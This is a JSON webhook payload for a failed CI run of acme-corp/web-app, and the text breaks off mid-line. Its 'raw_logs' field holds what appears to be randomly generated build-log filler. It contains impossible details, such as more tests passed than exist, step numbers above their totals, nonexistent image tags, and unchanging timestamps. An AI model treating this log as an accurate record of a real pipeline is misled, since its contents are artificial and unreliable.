{
  "action": "completed",
  "workflow_run": {
    "id": 50,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "26472196cdc4615221a65652e193b507cff1ebeb",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-29T12:45:56.049573Z",
    "updated_at": "2025-11-29T12:48:56.356380Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\n[12:45:56] INFO: Request completed\nTime: 67.39s\nHEAD is now at 197412f\nGET /api - 204 (20ms)\nTime: 3.757s\nGenerating source maps...\nDone.\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 438 passed, 475 total\nOK\nnpm notice: package.json updated\nCompiling src/index.js...\n  PASS: test_cache_hit (316ms)\n[12:45:56] DEBUG: Initializing service\npip: Downloading eslint-2.13.tar.gz\nUploading artifact 'build' (39 files)\nChecking out main branch\nWaiting...\npip: Collecting axios\nCoverage: 94% statements, 78% branches\nCache invalidated: dependencies\nCache miss for key-5634\nCache saved successfully\nArtifact downloaded: 5MB\nWARNING: react has known vulnerabilities\nSuccess!\nReady.\nAlready up to date.\nTime: 47.291s\nCache hit for key-2239\nyarn add: Done in 1.47s\nStep 6/21: Installing dependencies\n[12:45:56] INFO: Cache refreshed\nCache saved successfully\nOK\nPlatform: linux-x64\nFetching from https://amazonaws.com/package.json\nLayer 10/9: ENV command\nRan 22 tests in 3s\nPOST /data - 200 (89ms)\nImage pulled successfully\nWARNING: express has known vulnerabilities\nCache restored successfully (306MB)\nDone.\nCreating production build...\nCache restored successfully (197MB)\nVerifying...\nArtifact downloaded: 40MB\n\u2713 validate completed\nFAILED: test_auth_login\nPulling image: alpine:18\n[12:45:56] DEBUG: Loading configuration\nFetching from https://github.com/package.json\nStep 19/24: Installing dependencies\nFAILED: test_api_health\n[12:45:56] INFO: Cache refreshed\n[12:45:56] DEBUG: Loading configuration\nTransforming 329 files...\nTLS handshake completed\nNODE_ENV=production\nUsing Python 3.11\nSuccess!\nInstalling webpack@1.1.0\nnpm install: added 233 packages\n[12:45:56] INFO: Processing request\n  PASS: integration/test_db_connect.spec.js\nNODE_ENV=test\nProcessing...\npip: Collecting eslint\nCompiling components/utils.go...\nException: NullPointerException\nMinifying app.js\nCompiling lib/service.java...\n[12:45:56] DEBUG: Initializing service\nCompiling src/utils.go...\nUploading artifact 'dist' (22 files)\n[12:45:56] DEBUG: Connection pool: 13 active\n[12:45:56] INFO: Connecting to database\n[12:45:56] DEBUG: Loading configuration\nTLS handshake completed\n[12:45:56] ERROR: Connection failed\nWaiting...\nRan 85 tests in 18s\nCompiling utils/main.py...\nCache miss for key-4474\nnpm notice: created a lockfile\nChecking out develop branch\nCache restored successfully (147MB)\nStep 6/20: Running migrations\nOptimizing 34 modules...\n[12:45:56] WARN: Deprecated API usage\n\u2713 Task completed in 1061ms\npip: Installing build dependencies...\n\u2713 All checks passed\n[12:45:56] DEBUG: Query executed in 56ms\nTime: 62.657s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at f85e6ff\n[12:45:56] INFO: Connecting to database\nOptimizing 15 modules...\n\u2713 deploy completed\nCompiling lib/handler.rs...\n[12:45:56] DEBUG: Initializing service\nCache invalidated: build\n  PASS: integration/test_cache_hit.spec.js\n\u2713 All checks passed\nCompiling utils/utils.go...\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/17: Testing\nSuccess!\nCompiling src/main.py...\nSuccess!\n\u2713 Step 'checkout' succeeded\nSwitched to branch 'hotfix/task-785'\nGenerating source maps...\nnpm install: resolved 1185 packages\nVerifying...\nReady.\nProcessing...\nTime: 111.87s\nUsing Node.js 17.6.2\n[12:45:56] DEBUG: Loading configuration\nChecking out main branch\nWARNING: jest has known vulnerabilities\npip: Installing build dependencies...\nCompleted.\nLoading...\nNODE_ENV=test\nConnection established\n[12:45:56] DEBUG: Memory usage: 1480MB\nOK\n[12:45:56] INFO: Cache refreshed\nArtifact uploaded: dist.zip (73MB)\nDone.\nFinished.\nSwitched to branch 'bugfix/task-543'\n[12:45:56] INFO: Request completed\nMinifying vendor.js\nCache restored successfully (245MB)\npip: Installing build dependencies...\nCoverage: 96% statements, 65% branches\nDone.\nVerifying...\nnpm install: resolved 358 packages\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 92% statements, 89% branches\nnpm notice: created a lockfile\nCache saved successfully\npip: Installing build dependencies...\nStep 7/25: Deploying\nPushing to registry...\n\u2717 build failed with exit code 37\nBuilding Docker image...\nCache saved successfully\nTime: 105.454s\nCreating production build...\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\n[12:45:56] ERROR: Connection failed\nRan 23 tests in 49s\nArtifact uploaded: build.tar.gz (32MB)\n[12:45:56] INFO: Connecting to database\n[12:45:56] INFO: Cache refreshed\nCompiling components/app.ts...\nStep 13/19: Deploying\n[12:45:56] INFO: Processing request\nFinished.\n[12:45:56] WARN: Deprecated API usage\n[12:45:56] DEBUG: Connection pool: 9 active\n[12:45:56] INFO: Processing request\nInstalling lodash@5.5.1\nArtifact uploaded: build.tar.gz (19MB)\npip: Installing build dependencies...\n[12:45:56] ERROR: Connection failed\n\u2713 Task completed in 130ms\nFetching from https://amazonaws.com/package.json\nnpm notice: created a lockfile\nFinished.\nTLS handshake completed\n[12:45:56] INFO: Connecting to database\nUsing Node.js 14.4.3\nCache saved successfully\nStep 7/21: Deploying\nCache saved successfully\nArtifact downloaded: 18MB\nWARNING: eslint has known vulnerabilities\n  PASS: test_user_create (66ms)\nArtifact uploaded: dist.zip (58MB)\nOK\nCompleted.\n[12:45:56] DEBUG: Query executed in 34ms\nPushing to registry...\nSuccess!\npip: Installing build dependencies...\nUsing Node.js 16.14.9\n[12:45:56] ERROR: Connection failed\n\u2713 Step 'install' succeeded\n[12:45:56] INFO: Processing request\n[12:45:56] WARN: Deprecated API usage\nyarn add: Done in 8.43s\nTransforming 660 files...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 Task completed in 4656ms\nCompiling components/utils.go...\nOptimizing 23 modules...\nGET /health - 200 (23ms)\n\u2713 validate completed\n[12:45:56] DEBUG: Connection pool: 7 active\nnpm notice: created a lockfile\nCreating production build...\nArtifact downloaded: 36MB\nCompiling components/handler.rs...\n[12:45:56] INFO: Processing request\n  PASS: e2e/test_auth_login.spec.js\n[12:45:56] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\nFinished.\n\u2713 All checks passed\nDone.\nOptimizing 85 modules...\nLoading...\nUsing Node.js 19.10.1\nStep 1/19: Installing dependencies\nCache miss for key-5954\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/handler.rs...\nnpm install: added 428 packages\nBundling main.js\nBuilding Docker image...\nCache saved successfully\n[12:45:56] INFO: Connecting to database\nPulling image: node:18\n  PASS: test_db_connect (392ms)\nSuccess!\nArtifact downloaded: 39MB\nCache hit for key-1090\nUsing Node.js 20.9.10\nStep 15/22: Testing\nDone.\nStep 2/22: Deploying\nImage pulled successfully\nReady.\nUsing Python 3.11\nCache invalidated: build\nRan 76 tests in 13s\n[12:45:56] DEBUG: Loading configuration\n[12:45:56] INFO: Connecting to database\nBundling main.js\n  PASS: unit/test_user_create.spec.js\nFinished.\nEnvironment: development\n[12:45:56] DEBUG: Connection pool: 2 active\n[12:45:56] INFO: Starting build process\nnpm install: resolved 1044 packages\nRan 27 tests in 18s\n[12:45:56] INFO: Cache refreshed\nNODE_ENV=test\nDone.\nTest Suites: 36 passed, 37 total\nnpm install: added 217 packages\npip: Downloading express-4.4.tar.gz\nGenerating source maps...\nStep 19/22: Linting\nException: ValueError\nHEAD is now at 33e6ec4\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-8398\nWARNING: jest has known vulnerabilities\nConnection established\n[12:45:56] DEBUG: Query executed in 98ms\nInstalling lodash@4.2.1\nyarn add: Done in 25.54s\n[12:45:56] INFO: Cache refreshed\nSnapshots: 19 passed, 29 total\nyarn add: Done in 2.92s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 11MB\nWaiting...\nPlatform: darwin-arm64\nTest Suites: 39 passed, 29 total\nPlatform: darwin-arm64\nOptimizing 77 modules...\nFetching from https://docker.io/package.json\n[12:45:56] INFO: Cache refreshed\n[12:45:56] INFO: Connecting to database\n\u2713 Step 'build' succeeded\nArtifact downloaded: 37MB\nUploading artifact 'build' (9 files)\nCache hit for key-5180\nCache hit for key-7979\nImage pulled successfully\nStep 2/20: Testing\npip: Collecting lodash\nPlatform: linux-x64\nStep 16/25: Testing\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/handler.rs...\n\u2713 Step 'checkout' succeeded\n[12:45:56] WARN: Deprecated API usage\nStep 17/21: Installing dependencies\nnpm install: added 16 packages\nProcessing...\nCache miss for key-3983\nArtifact uploaded: dist.zip (58MB)\nSuccess!\nArtifact uploaded: build.tar.gz (21MB)\nException: TypeError\nTLS handshake completed\n[12:45:56] INFO: Request completed\nTLS handshake completed\nLayer 2/10: RUN command\nVerifying...\nnpm install: added 315 packages\n\u2713 Task completed in 1338ms\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nWARNING: lodash has known vulnerabilities\nLayer 4/12: ENV command\n[12:45:56] INFO: Request completed\nFetching from https://pypi.org/package.json\nyarn add: Done in 11.16s\n\u2713 Task completed in 3074ms\npip: Collecting eslint\nCache saved successfully\n[12:45:56] INFO: Cache refreshed\nGenerating source maps...\n[12:45:56] INFO: Request completed\nWaiting...\npip: Downloading react-1.2.tar.gz\nReady.\nStep 17/21: Installing dependencies\nnpm install: resolved 856 packages\n[12:45:56] INFO: Cache refreshed\nStep 18/15: Linting\nHEAD is now at c2f55d8\nOK\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nnpm install: resolved 514 packages\n[12:45:56] INFO: Request completed\n[12:45:56] INFO: Processing request\nDone.\n[12:45:56] DEBUG: Loading configuration\nTime: 81.944s\nCache miss for key-7752\n  PASS: integration/test_api_health.spec.js\nLoading...\nCoverage: 98% statements, 62% branches\nyarn add: Done in 2.62s\nNODE_ENV=test\n\u2713 Task completed in 2188ms\nReady.\nMinifying app.js\n[12:45:56] DEBUG: Initializing service\nImage pulled successfully\nyarn add: Done in 26.38s\nStep 9/19: Testing\nStep 16/24: Building\nPushing to registry...\nCompiling src/main.py...\nnpm install: resolved 1234 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 394 packages\nTransforming 996 files...\nTLS handshake completed\nnpm notice: package.json updated\n  PASS: integration/test_cache_hit.spec.js\nnpm install: added 270 packages\nnpm notice: created a lockfile\nCoverage: 71% statements, 61% branches\nChecking out master branch\nnpm install: added 81 packages\nEnvironment: staging\npip: Installing build dependencies...\nInstalling prettier@2.13.1\nFinished.\nProcessing...\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (2MB)\nTransforming 381 files...\n[12:45:56] INFO: Request completed\nCreating production build...\nStep 18/19: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\nCache restored successfully (488MB)\nArtifact uploaded: build.tar.gz (5MB)\nStep 14/17: Linting\nCompiling lib/handler.rs...\nChecking out master branch\nArtifact downloaded: 34MB\n[12:45:56] INFO: Cache refreshed\n[12:45:56] INFO: Cache refreshed\nPOST /upload - 202 (177ms)\nWARNING: webpack has known vulnerabilities\nHEAD is now at 93ff915\n[12:45:56] DEBUG: Connection pool: 13 active\nUploading artifact 'build' (26 files)\nBundling runtime.js\nConnection established\nGET /health - 204 (94ms)\nCache hit for key-8051\nPlatform: darwin-arm64\nLoading...\n\u2713 Step 'install' succeeded\nSuccess!\nCompiling src/index.js...\npip: Collecting express\nTransforming 884 files...\nCoverage: 98% statements, 60% branches\nCache miss for key-4207\n\u2713 Step 'test' succeeded\nFetching submodules...\nStep 5/15: Running migrations\nWARNING: axios has known vulnerabilities\nInstalling lodash@1.3.1\n[12:45:56] INFO: Connecting to database\nProcessing...\nLayer 3/8: RUN command\nGenerating source maps...\nCompiling lib/utils.go...\nFAILED: test_db_connect\n[12:45:56] INFO: Request completed\nPulling image: node:3.11\n[12:45:56] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nNODE_ENV=development\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /api - 200 (22ms)\nFAILED: test_api_health\n[12:45:56] WARN: Deprecated API usage\nLoading...\nCompleted.\nHEAD is now at 24b6e6c\nConnection established\n\u2713 Task completed in 1778ms\n\u2713 Task completed in 1545ms\nEnvironment: test\nCache restored successfully (471MB)\nPushing to registry...\nyarn add: Done in 7.93s\nOptimizing 59 modules...\nCompiling lib/utils.go...\nFAILED: test_auth_login\n[12:45:56] INFO: Cache refreshed\n[12:45:56] DEBUG: Memory usage: 226MB\nStep 8/21: Installing dependencies\nStep 16/23: Testing\nyarn add: Done in 13.25s\nTLS handshake completed\nBundling styles.css\nHEAD is now at c3bf1cd\nSwitched to branch 'feature/task-754'\nUsing Node.js 18.2.9\nnpm install: resolved 694 packages\nStep 5/22: Testing\n\u2713 All checks passed\nUploading artifact 'coverage' (36 files)\nWARNING: eslint has known vulnerabilities\nGenerating source maps...\nFetching submodules...\nStep 4/16: Building\n\u2713 Task completed in 1888ms\n[12:45:56] INFO: Cache refreshed\nLayer 1/15: ENV command\nCache saved successfully\n[12:45:56] WARN: Deprecated API usage\n[12:45:56] DEBUG: Connection pool: 12 active\nCache saved successfully\nChecking out main branch\n[12:45:56] DEBUG: Memory usage: 1424MB\n=== Step e2e_tests completed ===\n=== Step: setup_environment ===\n\u2713 test completed\nRan 192 tests in 3s\nPulling image: node:3.11\nHEAD is now at 1eae5f3\nWARNING: express has known vulnerabilities\nBundling runtime.js\nReady.\n[12:45:56] DEBUG: Initializing service\nStep 17/19: Deploying\nMinifying main.js\n[12:45:56] ERROR: Connection failed\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:56] ERROR: Connection failed\nCache miss for key-7641\nStep 17/23: Linting\nFetching submodules...\nUsing Node.js 16.7.3\n[12:45:56] WARN: Deprecated API usage\nyarn add: Done in 17.82s\n[12:45:56] INFO: Cache refreshed\npip install: Successfully installed prettier-1.1\n\u2713 Task completed in 246ms\nGET /health - 201 (90ms)\n\u2713 All checks passed\nnpm install: resolved 189 packages\nArtifact uploaded: build.tar.gz (40MB)\nImage pulled successfully\nReady.\n[12:45:56] WARN: Deprecated API usage\n  PASS: unit/test_user_create.spec.js\nReady.\nCache restored successfully (192MB)\nBuilding Docker image...\nException: ValueError\nNODE_ENV=development\n[12:45:56] INFO: Cache refreshed\n[12:45:56] DEBUG: Connection pool: 11 active\nTest Suites: 47 passed, 19 total\nnpm install: added 34 packages\nCache hit for key-4996\nArtifact downloaded: 14MB\nArtifact uploaded: dist.zip (78MB)\n[12:45:56] WARN: Deprecated API usage\n[12:45:56] DEBUG: Initializing service\nStep 4/16: Building\nFAILED: test_user_create\nCompleted.\nCache invalidated: dependencies\nStep 2/21: Linting\n[12:45:56] INFO: Connecting to database\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: dist.zip (14MB)\nStep 16/22: Linting\nLayer 2/13: ENV command\nHEAD is now at 7260b70\nFetching from https://pypi.org/package.json\nInstalling lodash@4.6.8\nFinished.\nPulling image: python:3.11\nStep 3/15: Installing dependencies\nArtifact downloaded: 36MB\nRan 104 tests in 30s\nHEAD is now at 85eb8e1\n[12:45:56] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/main.py...\npip: Collecting lodash\nConnection established\n\u2713 Task completed in 1457ms\nStep 6/22: Installing dependencies\nCache invalidated: dependencies\nArtifact downloaded: 29MB\nBuilding Docker image...\n[12:45:56] DEBUG: Initializing service\nGET /status - 201 (21ms)\n\u2713 Step 'setup' succeeded\nnpm notice: created a lockfile\nCreating production build...\nOK\nSuccess!\nConnection established\n\u2717 build failed with exit code 64\nMinifying vendor.js\nCache miss for key-5554\n  PASS: e2e/test_auth_login.spec.js\nHEAD is now at 8179ea1\nCoverage: 84% statements, 86% branches\n[12:45:56] DEBUG: Initializing service\nArtifact uploaded: dist.zip (58MB)\nImage pulled successfully\nWARNING: axios has known vulnerabilities\nCompiling components/service.java...\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 28 passed, 16 total\nRan 195 tests in 14s\nLoading...\nArtifact uploaded: dist.zip (68MB)\nPOST /upload - 202 (442ms)\nnpm notice: created a lockfile\nEnvironment: staging\nStep 6/18: Building\nOK\nFetching submodules...\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 104\nPOST /api - 201 (283ms)\nGET /status - 200 (67ms)\n[12:45:56] DEBUG: Loading configuration\n[12:45:56] INFO: Processing request\nCache invalidated: node_modules\n\u2717 build failed with exit code 51\nFAILED: test_user_create\nLoading...\nProcessing...\nPOST /upload - 200 (427ms)\nArtifact uploaded: build.tar.gz (20MB)\nLayer 2/10: COPY command\nUsing Python 3.11\n\u2717 build failed with exit code 18\nStep 3/19: Linting\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=development\nFetching submodules...\nRan 60 tests in 15s\nFAILED: test_db_connect\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (28MB)\nHEAD is now at f2907b3\nCache saved successfully\nStep 5/20: Linting\n[12:45:56] INFO: Connecting to database\npip install: Successfully installed jest-5.11\nSwitched to branch 'hotfix/task-323'\nSuccess!\nException: RuntimeError\nGET /status - 204 (48ms)\nRan 47 tests in 37s\nArtifact uploaded: dist.zip (50MB)\nBuilding Docker image...\n  PASS: unit/test_api_health.spec.js\nProcessing...\nLoading...\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: e2e/test_api_health.spec.js\n\u2713 All checks passed\nAlready up to date.\n\u2713 All checks passed\n[12:45:56] WARN: Deprecated API usage\nEnvironment: development\nWARNING: axios has known vulnerabilities\n[12:45:56] DEBUG: Memory usage: 507MB\nMinifying main.js\nLoading...\nAlready up to date.\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nChecking out main branch\nInstalling express@2.16.4\nnpm install: added 83 packages\nStep 13/22: Linting\npip: Installing build dependencies...\nSuccess!\nPulling image: node:18\nArtifact uploaded: dist.zip (1MB)\n[12:45:56] INFO: Processing request\nCache hit for key-7658\nChecking out master branch\nCache miss for key-1150\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache saved successfully\nCompleted.\nVerifying...\nOK\nTests: 326 passed, 242 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/25: Running migrations\nTime: 34.244s\nWaiting...\nException: NullPointerException\nStep 17/22: Linting\nLoading...\nCache restored successfully (285MB)\nArtifact uploaded: dist.zip (32MB)\npip: Collecting axios\nReady.\nChecking out master branch\n\u2717 build failed with exit code 88\nRan 134 tests in 39s\nyarn add: Done in 15.35s\n\u2713 Task completed in 284ms\nCreating production build...\nArtifact uploaded: dist.zip (14MB)\nCompiling utils/service.java...\nPOST /api - 200 (36ms)\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting jest\nConnection established\nPOST /upload - 200 (124ms)\nWARNING: webpack has known vulnerabilities\n\u2713 All checks passed\nImage pulled successfully\nArtifact uploaded: build.tar.gz (48MB)\nStep 16/17: Linting\n[12:45:56] WARN: Deprecated API usage\nBuilding Docker image...\nImage pulled successfully\n\u2713 Step 'build' succeeded\n[12:45:56] INFO: Cache refreshed\n[12:45:56] INFO: Starting build process\nnpm notice: created a lockfile\nPOST /data - 200 (248ms)\nCreating production build...\nTest Suites: 44 passed, 35 total\nOK\n  PASS: test_db_connect (250ms)\n[12:45:56] ERROR: Connection failed\nTLS handshake completed\nTests: 68 passed, 380 total\nReady.\nMinifying app.js\nFetching from https://googleapis.com/package.json\nUsing Node.js 14.0.4\nCompleted.\nFetching from https://googleapis.com/package.json\nFAILED: test_db_connect\nCompleted.\nGenerating source maps...\nPOST /upload - 202 (403ms)\nCache invalidated: node_modules\nConnection established\nLayer 9/15: ENV command\nyarn add: Done in 18.65s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 12/25: Linting\nCreating production build...\nnpm notice: package.json updated\n[12:45:56] INFO: Connecting to database\nSnapshots: 34 passed, 50 total\nUsing Node.js 20.6.6\nNODE_ENV=test\nSuccess!\nVerifying...\n[12:45:56] DEBUG: Initializing service\n\u2713 lint completed\nArtifact downloaded: 34MB\n[12:45:56] INFO: Starting build process\nNODE_ENV=test\nTransforming 299 files...\nHEAD is now at e68c9b6\nAlready up to date.\nCache restored successfully (161MB)\nnpm install: added 174 packages\n\u2713 All checks passed\nLoading...\n[12:45:56] INFO: Connecting to database\n[12:45:56] INFO: Starting build process\nFetching from https://amazonaws.com/package.json\nArtifact uploaded: dist.zip (11MB)\npip install: Successfully installed webpack-2.9\nCreating production build...\n[12:45:56] INFO: Connecting to database\n[12:45:56] ERROR: Connection failed\nTests: 363 passed, 187 total\n[12:45:56] WARN: Deprecated API usage\nCache invalidated: node_modules\n\u2713 Task completed in 2971ms\nBundling runtime.css\n[12:45:56] DEBUG: Query executed in 63ms\nCompleted.\nFetching from https://gcr.io/package.json\nCompiling src/handler.rs...\nSuccess!\nUsing Node.js 18.17.2\n[12:45:56] INFO: Processing request\n\u2717 build failed with exit code 56\n[12:45:56] INFO: Request completed\nConnection established\nCompiling lib/handler.rs...\n[12:45:56] DEBUG: Connection pool: 11 active\nCompiling src/utils.go...\nTLS handshake completed\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nCompleted.\n[12:45:56] INFO: Request completed\nUploading artifact 'build' (18 files)\nReady.\nInstalling lodash@4.13.8\nStep 19/23: Deploying\nBuilding Docker image...\n  PASS: unit/test_api_health.spec.js\nCompiling src/service.java...\nStep 14/17: Running migrations\nArtifact uploaded: dist.zip (100MB)\nPOST /api - 202 (494ms)\npip: Installing build dependencies...\nnpm notice: package.json updated\n  PASS: test_cache_hit (168ms)\nMinifying vendor.js\n  PASS: e2e/test_user_create.spec.js\nCreating production build...\n  PASS: test_user_create (429ms)\nCompiling lib/service.java...\nCache invalidated: dependencies\n[12:45:56] INFO: Connecting to database\n[12:45:56] DEBUG: Memory usage: 597MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 45 modules...\nPulling image: python:latest\nStep 17/25: Linting\nException: RuntimeError\nCompiling components/index.js...\nFAILED: test_api_health\nGenerating source maps...\n=== Step unit_tests completed ===\n=== Step: type_check ===\nCompiling components/service.java...\nArtifact uploaded: dist.zip (89MB)\npip: Installing build dependencies...\nRan 200 tests in 16s\npip: Collecting axios\n[12:45:56] DEBUG: Query executed in 84ms\n\u2713 lint completed\nStep 6/24: Installing dependencies\nFAILED: test_auth_login\nCache miss for key-3465\nGenerating source maps...\n[12:45:56] INFO: Processing request\nSwitched to branch 'hotfix/task-865'\n  PASS: integration/test_user_create.spec.js\n\u2713 Step 'checkout' succeeded\n\u2713 Task completed in 293ms\npip install: Successfully installed express-3.10\n\u2713 All checks passed\n[12:45:56] DEBUG: Initializing service\nStep 10/15: Building\n[12:45:56] WARN: Deprecated API usage\nWaiting...\nStep 20/21: Building\n[12:45:56] DEBUG: Initializing service\nCompiling components/main.py...\nReady.\nNODE_ENV=production\nUploading artifact 'build' (33 files)\n[12:45:56] INFO: Request completed\n[12:45:56] DEBUG: Loading configuration\nPOST /api - 201 (475ms)\nStep 12/21: Deploying\nOK\nCompleted.\n  PASS: e2e/test_cache_hit.spec.js\nInstalling axios@5.10.3\n[12:45:56] DEBUG: Connection pool: 16 active\nVerifying...\nTransforming 469 files...\nReady.\npip install: Successfully installed react-3.11\nNODE_ENV=development\nnpm install: resolved 879 packages\nOptimizing 18 modules...\nNODE_ENV=production\nStep 2/23: Testing\nNODE_ENV=development\nGET /health - 200 (21ms)\n[12:45:56] DEBUG: Initializing service\nTime: 93.485s\nException: RuntimeError\n[12:45:56] DEBUG: Connection pool: 17 active\nSuccess!\nStep 20/24: Running migrations\npip: Downloading express-1.19.tar.gz\n[12:45:56] INFO: Processing request\nStep 11/18: Linting\n[12:45:56] DEBUG: Loading configuration\n  PASS: test_api_health (271ms)\npip: Installing build dependencies...\nOptimizing 36 modules...\npip: Collecting eslint\n[12:45:56] INFO: Starting build process\n\u2713 Task completed in 1969ms\nCompiling src/handler.rs...\n[12:45:56] DEBUG: Connection pool: 11 active\nnpm notice: package.json updated\n\u2713 lint completed\nDone.\n[12:45:56] WARN: Deprecated API usage\nSnapshots: 34 passed, 40 total\nPushing to registry...\n[12:45:56] DEBUG: Memory usage: 1311MB\nnpm install: resolved 690 packages\nArtifact uploaded: dist.zip (4MB)\nUsing Python 3.11\nReady.\n[12:45:56] INFO: Request completed\nCompiling utils/app.ts...\nPlatform: win32-x64\nStep 17/15: Testing\nCache saved successfully\nWARNING: eslint has known vulnerabilities\nFetching submodules...\nUploading artifact 'build' (15 files)\nnpm notice: created a lockfile\n[12:45:56] INFO: Starting build process\nWaiting...\npip: Collecting lodash\n[12:45:56] INFO: Request completed\nReady.\nUsing Node.js 19.0.5\n\u2717 build failed with exit code 62\nFinished.\nCache invalidated: build\nCoverage: 80% statements, 66% branches\nCache hit for key-4006\nTests: 329 passed, 250 total\nFinished.\nCompiling utils/service.java...\n[12:45:56] INFO: Request completed\nCache invalidated: node_modules\nNODE_ENV=production\nStep 2/23: Testing\n[12:45:56] INFO: Cache refreshed\nUsing Python 3.11\nLoading...\nDone.\nFetching submodules...\nNODE_ENV=test\nMinifying main.js\nCache restored successfully (408MB)\nPlatform: linux-x64\nCache restored successfully (104MB)\nTLS handshake completed\nCompiling src/main.py...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting webpack\nCompiling lib/service.java...\nCompiling components/main.py...\npip install: Successfully installed prettier-1.7\nFinished.\nNODE_ENV=test\nVerifying...\nStep 20/25: Linting\npip: Collecting prettier\n\u2713 Step 'setup' succeeded\n[12:45:56] DEBUG: Memory usage: 1429MB\nWaiting...\nArtifact uploaded: dist.zip (42MB)\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out master branch\nPOST /api - 201 (265ms)\nGET /status - 204 (91ms)\nnpm notice: package.json updated\n\u2713 Step 'setup' succeeded\nPulling image: alpine:latest\nFetching from https://npmjs.org/package.json\nBuilding Docker image...\nMinifying main.js\nInstalling eslint@3.5.5\n[12:45:56] DEBUG: Connection pool: 14 active\nnpm notice: package.json updated\nUsing Node.js 16.20.7\nCache hit for key-8407\nStep 19/23: Installing dependencies\nnpm notice: created a lockfile\nSuccess!\n[12:45:56] WARN: Deprecated API usage\nInstalling prettier@1.8.4\nHEAD is now at 672526c\n\u2713 Task completed in 4566ms\nImage pulled successfully\nSuccess!\n[12:45:56] INFO: Processing request\nInstalling express@5.1.8\nRan 73 tests in 35s\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\n[12:45:56] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@5.6.8\nAlready up to date.\nGenerating source maps...\nNODE_ENV=development\nArtifact downloaded: 5MB\npip: Collecting eslint\nProcessing...\nInstalling express@3.6.0\nCache saved successfully\nStep 2/18: Linting\nBundling main.css\nStep 17/19: Deploying\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:56] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://registry.npmjs.org/package.json\nStep 17/18: Running migrations\nCache miss for key-5459\nCache miss for key-4435\nFinished.\nWARNING: react has known vulnerabilities\nVerifying...\nStep 7/22: Building\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: dist.zip (71MB)\nProcessing...\nRan 108 tests in 14s\n\u2717 build failed with exit code 29\n[12:45:56] DEBUG: Query executed in 83ms\n  PASS: integration/test_user_create.spec.js\nUploading artifact 'coverage' (6 files)\nRan 180 tests in 52s\n\u2713 Step 'checkout' succeeded\nCache saved successfully\nLoading...\nCompiling src/utils.go...\nnpm install: resolved 960 packages\nStep 15/25: Deploying\n[12:45:56] INFO: Connecting to database\nStep 4/17: Running migrations\n[12:45:56] WARN: Deprecated API usage\n  PASS: test_cache_hit (320ms)\nException: ValueError\nOK\nCache saved successfully\nnpm install: resolved 1775 packages\nConnection established\nPushing to registry...\npip: Collecting react\nArtifact uploaded: dist.zip (20MB)\nConnection established\nCache hit for key-3999\nProcessing...\npip: Installing build dependencies...\nTests: 460 passed, 324 total\n[12:45:56] DEBUG: Loading configuration\nFinished.\nTime: 24.620s\nStep 10/22: Building\nAlready up to date.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 2/18: Running migrations\npip install: Successfully installed axios-1.4\nGET /health - 201 (8ms)\nStep 9/17: Testing\nNODE_ENV=production\nWaiting...\nStep 4/16: Testing\nPushing to registry...\n\u2713 Task completed in 3722ms\nMinifying main.js\nyarn add: Done in 5.46s\nNODE_ENV=development\n[12:45:56] INFO: Starting build process\n  PASS: test_db_connect (345ms)\nNODE_ENV=production\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:56] WARN: Deprecated API 